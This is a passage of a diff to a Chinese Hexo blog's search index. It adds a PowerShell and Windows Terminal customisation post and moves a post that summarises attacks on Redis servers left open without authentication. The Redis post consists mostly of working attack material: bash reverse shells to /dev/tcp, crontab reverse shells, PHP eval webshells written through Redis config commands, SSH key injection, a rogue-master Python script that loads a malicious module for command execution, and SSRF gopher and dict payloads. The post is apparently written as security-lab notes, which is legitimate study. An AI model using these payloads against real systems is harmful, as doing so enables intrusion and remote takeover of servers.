右键，逐字补全</span></span><br><span class="line"><span class="built_in">Set-PSReadLineKeyHandler</span> <span class="literal">-Chord</span> <span class="string">&quot;Ctrl+RightArrow&quot;</span> <span class="literal">-Function</span> ForwardWord</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-PSReadLineOption</span> <span class="literal">-Colors</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">    Command             = <span class="string">&quot;#e5c07b&quot;</span></span><br><span class="line">    Number              = <span class="string">&quot;#cdd4d4&quot;</span></span><br><span class="line">    Member              = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    Operator            = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    <span class="built_in">Type</span>                = <span class="string">&quot;#78b6e9&quot;</span></span><br><span class="line">    Variable            = <span class="string">&quot;#78b6e9&quot;</span></span><br><span class="line">    <span class="keyword">Parameter</span>           = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    ContinuationPrompt  = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    Default             = <span class="string">&quot;#cdd4d4&quot;</span></span><br><span class="line">    Emphasis            = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    Selection           = <span class="string">&quot;#cdd4d4&quot;</span></span><br><span class="line">    Comment             = <span class="string">&quot;#cdd4d4&quot;</span></span><br><span class="line">    Keyword             = <span class="string">&quot;#e06c75&quot;</span></span><br><span class="line">    String              = <span class="string">&quot;#78b6e9&quot;</span></span><br><span class="line">    InlinePrediction    = <span class="string">&quot;#9f9193&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># PSFzf</span></span><br><span class="line"><span class="comment"># Set-PSFzfOption -PSReadlineChordProvider &#x27;Ctrl+f&#x27; -PSReadlineChordReverseHistory &#x27;Ctrl+r&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # -----------starship----------</span></span><br><span class="line"><span class="built_in">Invoke-Expression</span> (&amp;starship init powershell)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------command----------- </span></span><br><span class="line"><span class="comment"># function prompt</span></span><br><span class="line"><span class="comment"># &#123;</span></span><br><span class="line"><span class="comment">#     #Write-Host(&quot;$pwd&gt;&quot;)</span></span><br><span class="line"><span class="comment">#     # &quot;syyu@win &quot; + &quot;$pwd ~ `n $ &quot;</span></span><br><span class="line"><span class="comment">#     &quot; syyu@win &quot; + &quot;$pwd `n $ &quot;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------pshazz----------</span></span><br><span class="line"><span class="comment"># try &#123; $null = gcm pshazz -ea stop; pshazz init &#x27;default&#x27; &#125; catch &#123; &#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><blockquote>
+<p>  C:\Users\%USERNAME%\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1</p>
+</blockquote>
+<p>好了，大致的配置就结束了。</p>
+<p>看一波效果图…</p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/2022/02/202202071644240415.png" alt="image-20220207212029891"></p>
+<p>还有一些配置和图片，下次一定，先建个#TODO ，哈哈哈哈</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://docs.microsoft.com/zh-cn/windows/terminal/">https://docs.microsoft.com/zh-cn/windows/terminal/</a></p>
+<p><a href="https://juejin.cn/post/6984620463917891614">https://juejin.cn/post/6984620463917891614</a></p>
+<p><a href="https://elfile4138.moe/2021/08/Windows-Terminal%E7%9A%84%E9%85%8D%E7%BD%AE/">https://elfile4138.moe/2021/08/Windows-Terminal%E7%9A%84%E9%85%8D%E7%BD%AE/</a></p>
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
+        <tag>美化</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Windows下快速切换全拼/双拼</title>
     <url>/articles/d4db3d41/</url>
     <content><![CDATA[<h1 id="Windows下快速切换全拼-双拼"><a href="#Windows下快速切换全拼-双拼" class="headerlink" title="Windows下快速切换全拼/双拼"></a>Windows下快速切换全拼/双拼</h1><h2 id="bat批处理文件方式"><a href="#bat批处理文件方式" class="headerlink" title="bat批处理文件方式"></a>bat批处理文件方式</h2><h3 id="change-bat"><a href="#change-bat" class="headerlink" title="change.bat"></a>change.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS </span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>) </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg ( reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x1 /f ) <span class="keyword">else</span> ( reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x0 /f )</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>
@@ -522,151 +726,6 @@
         <tag>网络安全</tag>
         <tag>漏洞复现</tag>
         <tag>域提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Redis未授权访问利用方式总结</title>
-    <url>/articles/d81db563/</url>
-    <content><![CDATA[<h1 id="Redis未授权访问利用方式总结"><a href="#Redis未授权访问利用方式总结" class="headerlink" title="Redis未授权访问利用方式总结"></a>Redis未授权访问利用方式总结</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>官方下载地址: <a href="https://download.redis.io/releases/">https://download.redis.io/releases/</a></p>
-<p>编译安装, </p>
-<p>或者使用Docker 环境</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// docker pull redis:4.0</span><br><span class="line">docker pull redis:5.0</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="基础利用"><a href="#基础利用" class="headerlink" title="基础利用"></a>基础利用</h2><ul>
-<li><h4 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h4></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.119.137/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-<h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set webshell &quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
-<h3 id="计划任务反弹shell"><a href="#计划任务反弹shell" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h3><p>利用crontab反弹shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set x &quot;\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.119.1/7777 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
-<h3 id="写入公钥"><a href="#写入公钥" class="headerlink" title="写入公钥"></a>写入公钥</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config get dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;/&quot;</span><br><span class="line">127.0.0.1:6379&gt; config set dir /root/.ssh/</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; config get dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;/root/.ssh&quot;</span><br><span class="line">127.0.0.1:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; set x &quot;AAAAB3NzaC1yc2EAAAADAQABAAABgQCzmbxEDVJkRj8CfUb94H//exUqIxTe67ssJBHYJVok9ZVB3g8SYdHrkzrXZpfx5VqgoCEJjNNwuVGP/2R3AK/XgtqYcCAfzWnBRdA8vW5LVzB61wqyYIugQaC9y56x+QTTXuKTltgjpjuBXsAlQ6+5TlPB79qonV/xEsAr7PzxghhtxIZF2A+XTxrTJ4ByfUCvfpZ1ORxNdbnVEWMfSR6RYko9eVkC5AuRiscdYKumrP5Waoj4ET5D+/rRPxE9SPSAIRYs68DZ9mbkKhHgZLVCqNfFp1yZ/t97DfKihn9nRWwQjetSsrqLDbBfhLA0Frq0o+usaevuSL5dgToSwLg5IuWMVvdkcpbK92M9eb7Y0aWgSfGXbkaVegCtriDRYLNK/8rifro1vKwIG1aBcR7NyEe0KGQV9pYO8HPY0TpDq4eDNq1lAGTgND/DAVqXnVce9yPID+XgPhpTt1gxzGdjaNDNSZTotsHppK3EsYsV54QlMseIubHP0DXpgSkLWws=&quot; (PS: 这里内容为公钥 中间的密钥文件)</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -p 10022 -i id_rsa root@127.0.0.1</span><br><span class="line">-p 指定端口</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032107903.png" alt="image-20201124124820325"></p>
-<h2 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h2><p><strong>Redis主从复制详解:</strong> </p>
-<p><a href="https://www.bbsmax.com/A/l1dyv3Agze/">https://www.bbsmax.com/A/l1dyv3Agze/</a></p>
-<p><strong>主从复制流量分析:</strong></p>
-<p><a href="https://inhann.top/2021/09/14/redis_master_slave_rce/">https://inhann.top/2021/09/14/redis_master_slave_rce/</a></p>
-<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="使用-Docker-搭建"><a href="#使用-Docker-搭建" class="headerlink" title="使用 Docker 搭建"></a>使用 Docker 搭建</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull redis:5.0</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Redis_1</span><br><span class="line">docker run -it -d -p 6380:6379 --name Redis_1 redis:5.0</span><br></pre></td></tr></table></figure>
-
-<h4 id="编译源码搭建"><a href="#编译源码搭建" class="headerlink" title="编译源码搭建"></a>编译源码搭建</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://download.redis.io/releases/redis-5.0.14.tar.gz</span><br><span class="line">tar xvf redis-5.0.14.tar.gz</span><br><span class="line">cd redis-5.0.14</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
-
-<p><strong>保护模式报错</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032107733.png" alt="image-20211203143019591"></p>
-<p><strong>解决方式</strong></p>
-<p>配置文件中可以关闭保护模式</p>
-<p> <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032107688.png" alt="image-20211203143103050"></p>
-<p><strong>配置绑定ip</strong> </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bind 192.168.56.106 // 或者 0.0.0.0</span><br></pre></td></tr></table></figure>
-
-<p> <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032107992.png" alt="image-20211203143328195"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032108446.png" alt="image-20211203143350114"></p>
-<p> <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032108939.png" alt="image-20211203143411876"></p>
-<h3 id="构建恶意-so-文件"><a href="#构建恶意-so-文件" class="headerlink" title="构建恶意 .so 文件"></a>构建恶意 .so 文件</h3><p>github项目地址: <a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd RedisModules-ExecuteCommand</span><br><span class="line">make</span><br><span class="line"># module.so 在src目录下</span><br></pre></td></tr></table></figure>
-
-<p>导入模块方式</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-server ./redis.conf --loadmodule ./module.so</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h xxxxx</span><br><span class="line">&gt; module load ./module.so</span><br></pre></td></tr></table></figure>
-
-<p><strong>命令执行</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; system.exec &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="脚本探测"><a href="#脚本探测" class="headerlink" title="脚本探测:"></a>脚本探测:</h3><p><a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python redis-rce.py -r 192.168.56.106 -p 6380 -L 192.168.56.106  -f module.so</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032108335.png" alt="image-20211203151828074"></p>
-<h3 id="手工探测"><a href="#手工探测" class="headerlink" title="手工探测"></a>手工探测</h3><hr>
-<p><strong>恶意Redis服务端模拟脚本</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RogueServer</span>(<span class="params">lport</span>):</span></span><br><span class="line">    resp = <span class="string">&quot;&quot;</span></span><br><span class="line">    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.bind((<span class="string">&quot;0.0.0.0&quot;</span>,lport))</span><br><span class="line">    sock.listen(<span class="number">10</span>)</span><br><span class="line">    conn,address = sock.accept()  </span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:    </span><br><span class="line">        data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;PING&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            resp=<span class="string">&quot;+PONG&quot;</span>+CLRF</span><br><span class="line">            conn.send(resp)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;REPLCONF&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            resp=<span class="string">&quot;+OK&quot;</span>+CLRF</span><br><span class="line">            conn.send(resp)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;PSYNC&quot;</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;SYNC&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            resp =  <span class="string">&quot;+FULLRESYNC &quot;</span> + <span class="string">&quot;Z&quot;</span>*<span class="number">40</span> + <span class="string">&quot; 1&quot;</span> + CLRF</span><br><span class="line">            resp += <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(payload)) + CLRF</span><br><span class="line">            resp = resp.encode()</span><br><span class="line">            resp += payload + CLRF.encode()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(resp) != <span class="built_in">bytes</span>:</span><br><span class="line">                resp =resp.encode()            </span><br><span class="line">            conn.send(resp)    </span><br><span class="line">        <span class="comment">#elif &quot;exit&quot; in data:</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    parser = OptionParser()                     </span><br><span class="line">    parser.add_option(<span class="string">&quot;--lport&quot;</span>, dest=<span class="string">&quot;lp&quot;</span>, <span class="built_in">type</span>=<span class="string">&quot;int&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;rogue server listen port, default 21000&quot;</span>, default=<span class="number">21000</span>,metavar=<span class="string">&quot;LOCAL_PORT&quot;</span>)        </span><br><span class="line">    parser.add_option(<span class="string">&quot;-f&quot;</span>,<span class="string">&quot;--exp&quot;</span>, dest=<span class="string">&quot;exp&quot;</span>, <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>,<span class="built_in">help</span>=<span class="string">&quot;Redis Module to load, default exp.so&quot;</span>, default=<span class="string">&quot;exp.so&quot;</span>,metavar=<span class="string">&quot;EXP_FILE&quot;</span>)            </span><br><span class="line"></span><br><span class="line">    (options , args )= parser.parse_args()</span><br><span class="line">    lport = options.lp</span><br><span class="line">    exp_filename = options.exp</span><br><span class="line"></span><br><span class="line">    CLRF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    payload=<span class="built_in">open</span>(exp_filename,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Start listing on port: %s&quot;</span> %lport</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Load the payload:   %s&quot;</span> %exp_filename     </span><br><span class="line">    RogueServer(lport)</span><br></pre></td></tr></table></figure>
-
-<p>运行脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python RogueServer.py --lport 8088 --exp exp.so</span><br></pre></td></tr></table></figure>
-
-<p> <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032109720.png" alt="image-20211203201601816"></p>
-<p>执行相关命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#设置redis的备份路径为当前目录</span><br><span class="line">&gt; config set dir ./</span><br><span class="line">#设置备份文件名为exp.so，默认为dump.rdb</span><br><span class="line">&gt; config set dbfilename exp.so</span><br><span class="line">#设置主服务器IP和端口</span><br><span class="line">&gt; slaveof 192.168.56.106 8088</span><br><span class="line">#加载恶意模块</span><br><span class="line">&gt; module load ./exp.so</span><br><span class="line">#切断主从，关闭复制功能</span><br><span class="line">&gt; slaveof no one</span><br><span class="line">#执行系统命令</span><br><span class="line">&gt; system.exec &#x27;whoami&#x27;</span><br><span class="line">&gt; system.rev 127.0.0.1 9999    </span><br><span class="line">#通过dump.rdb文件恢复数据</span><br><span class="line">&gt; config set dbfilename dump.rdb</span><br><span class="line">#删除exp.so</span><br><span class="line">&gt; system.exec &#x27;rm ./exp.so&#x27;</span><br><span class="line">#卸载system模块的加载</span><br><span class="line">&gt; module unload system</span><br></pre></td></tr></table></figure>
-
-<p> <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112032108634.png" alt="image-20211203201544438"></p>
-<h3 id="exp汇总"><a href="#exp汇总" class="headerlink" title="exp汇总"></a>exp汇总</h3><p>[+] 构造恶意so文件:  <a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p>
-<p><a href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a></p>
-<p><a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p>
-<p><a href="https://github.com/LoRexxar/redis-rogue-server">https://github.com/LoRexxar/redis-rogue-server</a></p>
-<p><strong>参考链接:</strong></p>
-<p><a href="https://www.cnblogs.com/xiaozi/p/13089906.html">https://www.cnblogs.com/xiaozi/p/13089906.html</a></p>
-<h2 id="SSRF利用方式"><a href="#SSRF利用方式" class="headerlink" title="SSRF利用方式"></a>SSRF利用方式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1</span><br><span class="line">代替方式: 127.1</span><br><span class="line">[::1]</span><br><span class="line">localhost</span><br><span class="line">转成10进制, 2130706433</span><br></pre></td></tr></table></figure>
-
-<p>通过dict协议利用redis的未授权访问反弹shell的步骤如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1、开启反弹shell的监听</span><br><span class="line">nc -l 9999</span><br><span class="line"># 2、依次执行下面的命令</span><br><span class="line">curl dict://192.168.0.119:6379/set:x:&quot;\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/9999 0&gt;&amp;1\n\n&quot;</span><br><span class="line">curl dict://192.168.0.119:6379/config:set:dir:/etc/</span><br><span class="line">curl dict://192.168.0.119:6379/config:set:dbfilename:crontab</span><br><span class="line">curl dict://192.168.0.119:6379/bgsave</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-file协议读取文件"><a href="#1-file协议读取文件" class="headerlink" title="1.file协议读取文件"></a>1.file协议读取文件</h3><p>这个协议可以读取系统的一些存放密码的文件，比如说linux的/etc/passwd或者windows的C:/windows/win.ini 等，或者说ctf中的flag文件。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxx.xxx.xx.xx/xx/xx.php?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-利用gphper协议"><a href="#2-利用gphper协议" class="headerlink" title="2.利用gphper协议"></a>2.利用gphper协议</h3><p>利用工具gphperus, 生成payload</p>
-<p><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopherus --exploit redis</span><br><span class="line">Ready To get SHELL</span><br><span class="line"></span><br><span class="line">What do you want?? (ReverseShell/PHPShell): PHPShell</span><br><span class="line"></span><br><span class="line">Give web root location of server (default is /var/www/html): </span><br><span class="line">Give PHP Payload (We have default PHP Shell): &lt;?php @eval($_POST[&#x27;cmd&#x27;])?&gt;</span><br><span class="line"></span><br><span class="line">Your gopher link is Ready to get PHP Shell:</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url=gopher://127.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252428%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B1%255D%2529%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原始内容: 需要两次url编码</span><br><span class="line">gopher://2130706433:6379/_set x &quot;\n\n\n&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;\n\n\n&quot;  </span><br><span class="line">config set dir /var/www/html  </span><br><span class="line">config set dbfilename shell.php  </span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="3-利用dict协议"><a href="#3-利用dict协议" class="headerlink" title="3.利用dict协议"></a>3.利用dict协议</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.20.51:28940/?url=dict://2130706433:6379/info</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.20.51:28940/?url=dict://2130706433:6379/set:x:&quot;&lt;?php @eval($_POST[1])?&gt;&quot;</span><br><span class="line">shell需要进行utf-8编码</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config:set:dir:/var/www/html</span><br><span class="line">config:set:dbfilename:shell.php</span><br><span class="line">set:x:&quot;&lt;?php @eval($_POST[1])?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=dict://2130706433:6379/set:x:&quot;\x3C\x3F\x70\x68\x70\x20\x40\x65\x76\x61\x6C\x28\x24\x5F\x50\x4F\x53\x54\x5B\x31\x5D\x29\x3F\x3E&quot;</span><br><span class="line">config:set:dir:/var/www/html</span><br><span class="line">config:set:dbfilename:shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl http://172.16.20.51:28151/?url=dict://2130706433:6379/config:get:dir</span><br><span class="line">-ERR Syntax error, try CLIENT (LIST | KILL | GETNAME | SETNAME | PAUSE | REPLY)</span><br><span class="line">*2</span><br><span class="line">$3</span><br><span class="line">dir</span><br><span class="line">$13</span><br><span class="line">/var/www/html</span><br><span class="line">+OK</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">将内容转成utf-<span class="number">8</span></span><br><span class="line">s = <span class="string">&quot;&lt;?php @eval($_POST[1])?&gt;&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    res += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i)).replace(<span class="string">&quot;0xa&quot;</span>,<span class="string">&quot;0x0a&quot;</span>).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">r&quot;\\x&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[1])?&gt;</span><br><span class="line">转成utf-8, \\x3c\\x3f\\x70\\x68\\x70\\x20\\x40\\x65\\x76\\x61\\x6c\\x28\\x24\\x5f\\x50\\x4f\\x53\\x54\\x5b\\x31\\x5d\\x29\\x3f\\x3e 对\进行转义</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl http://172.16.20.51:28151/?url=dict://2130706433:6379/set:x:\&quot;\\x3c\\x3f\\x70\\x68\\x70\\x20\\x40\\x65\\x76\\x61\\x6c\\x28\\x24\\x5f\\x50\\x4f\\x53\\x54\\x5b\\x31\\x5d\\x29\\x3f\\x3e\&quot;</span><br><span class="line">使用 curl 需要对x的键值进行转义</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;])?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h2><p><a href="https://zhuanlan.zhihu.com/p/36529010">https://zhuanlan.zhihu.com/p/36529010</a></p>
-<p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&amp;mid=2247483814&amp;idx=1&amp;sn=572eff495ac4e2f80583c27ddf8fe96b&amp;chksm=cf4d8ec7f83a07d1ad01d06e78c5905508ca32b38681f8c1268cdf0ae7d0f9e3d88e229cf87b">https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&amp;mid=2247483814&amp;idx=1&amp;sn=572eff495ac4e2f80583c27ddf8fe96b&amp;chksm=cf4d8ec7f83a07d1ad01d06e78c5905508ca32b38681f8c1268cdf0ae7d0f9e3d88e229cf87b</a></p>
-<p><a href="http://blog.leanote.com/post/snowming/2d9a2082c02b">http://blog.leanote.com/post/snowming/2d9a2082c02b</a></p>
-<p>[+] 利用主从复制getshell: <a href="https://www.cnblogs.com/xiaozi/p/13089906.html">https://www.cnblogs.com/xiaozi/p/13089906.html</a></p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>技巧</tag>
-        <tag>网络安全</tag>
-        <tag>总结</tag>
       </tags>
   </entry>
   <entry>
@@ -857,6 +916,151 @@
       </tags>
   </entry>
   <entry>
+    <title>Redis未授权访问利用方式总结</title>
+    <url>/articles/d81db563/</url>
+    <content><![CDATA[<h1 id="Redis未授权访问利用方式总结"><a href="#Redis未授权访问利用方式总结" class="headerlink" title="Redis未授权访问利用方式总结"></a>Redis未授权访问利用方式总结</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>官方下载地址: <a href="https://download.redis.io/releases/">https://download.redis.io/releases/</a></p>
+<p>编译安装, </p>
+<p>或者使用Docker 环境</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// docker pull redis:4.0</span><br><span class="line">docker pull redis:5.0</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="基础利用"><a href="#基础利用" class="headerlink" title="基础利用"></a>基础利用</h2><ul>
